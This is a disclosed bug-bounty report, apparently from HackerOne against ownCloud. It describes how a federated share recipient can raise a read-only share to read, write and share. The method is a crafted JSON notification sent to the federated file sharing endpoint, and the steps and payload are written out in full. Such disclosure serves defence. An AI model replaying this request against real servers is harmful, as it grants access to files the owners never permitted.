# Federated share permissions can be increased by recipient

## Report Details
- **Report ID**: 1990443
- **URL**: https://hackerone.com/reports/1990443
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-05-17T08:52:57.876Z
- **Disclosed**: 2023-06-24T08:28:41.084Z

## Reporter
- **Username**: rullzer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
1. userA on serverX does a federated share to userB on serverY (this by default is read only)
2. userB accepts the share
3. userB does a request to

```https://SERVERY/apps/federatedfilesharing/notifications```

With the content. Replacing the SHARE_TOKEN, and the SHARE_ID they find in their database

```
{
    "notificationType": "RESHARE_CHANGE_PERMISSION",
    "resourceType": "file",
    "providerId": "SHARE_ID",
    "notification": {
        "sharedSecret": "SHARE_TOKEN",
        "permission": ["read", "write", "share"]
    }
}
```

4. userB now has full access

## Impact

A recipient can increase their permissions trivially

## Attachments
No attachments
